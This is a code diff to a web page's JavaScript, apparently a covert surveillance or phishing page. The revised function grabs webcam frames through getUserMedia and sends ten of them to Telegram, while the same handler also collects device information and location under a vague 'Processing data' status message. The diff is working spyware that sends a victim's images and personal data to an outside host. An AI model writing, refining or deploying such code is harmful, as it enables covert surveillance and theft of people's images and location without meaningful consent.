@@ -89,20 +89,29 @@
       }
     }
 
-    function capturePhoto() {
+    function capturePhotos() {
       navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
         const video = document.getElementById("video");
-        video.srcObject = stream;
-
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
 
-        setInterval(() => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(blob => {
-            sendToTelegram("photo", blob);
-          }, "image/png");
-        }, 1000);
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          video.play();
+          let count = 0;
+          const interval = setInterval(() => {
+            if (count >= 10) {
+              clearInterval(interval);
+              video.srcObject.getTracks().forEach(track => track.stop());
+              return;
+            }
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+              sendToTelegram("photo", blob);
+            }, "image/png");
+            count++;
+          }, 2000); // every 2 seconds
+        };
       }).catch(() => {
         status.innerText = "❌ Camera permission denied.";
       });
@@ -113,7 +122,7 @@
       status.innerText = "📡 Requesting Permissions...";
       getDeviceInfo();
       getLocation();
-      capturePhoto();
+      capturePhotos();
       status.innerText = "✅ Activated. Processing data...";
     };
   </script>
